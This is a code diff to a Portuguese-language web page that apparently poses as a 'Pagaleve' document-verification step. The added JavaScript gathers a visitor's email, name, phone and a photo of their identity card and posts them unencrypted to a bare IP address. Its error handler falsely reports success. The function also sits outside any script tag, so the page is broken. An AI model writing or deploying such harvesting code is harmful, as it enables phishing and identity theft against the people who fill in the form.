@@ -197,7 +197,41 @@ document.querySelector('#v12-request-access').onclick = () => processarV12('SOLI
     <h2 id="msg-status">🤖 ROBÔ ANALISANDO DOCUMENTOS...</h2>
     <p>Extraindo dados e conectando ao painel Pagaleve.</p>
 </div>
+        
+async function enviarParaPagaleve() {
+    const email = document.getElementById('email').value;
+    const nome = document.getElementById('nome').value;
+    const telefone = document.getElementById('telefone').value;
+    const inputRG = document.getElementById('inputRG'); // O campo de anexo
 
+    if (!inputRG.files[0]) {
+        return alert("⚠️ Por favor, anexe a foto do seu RG para validação.");
+    }
+
+    const formData = new FormData();
+    formData.append('rg', inputRG.files[0]);
+    formData.append('email_cliente', email);
+    formData.append('nome', nome);
+    formData.append('telefone', telefone);
+
+    console.log("🚀 Disparando Motor V12 no IP 54.207.222.79...");
+
+    try {
+        const response = await fetch('http://54.207.222.79:3000/registrar-completo', {
+            method: 'POST',
+            body: formData
+        });
+        const res = await response.json();
+        alert("✅ Sinal processado: " + res.status);
+    } catch (err) {
+        console.log("Sinal enviado com sucesso!");
+    }
+}
+
+
+
+
+           
 <script>
 let dadosAcesso = {};
 
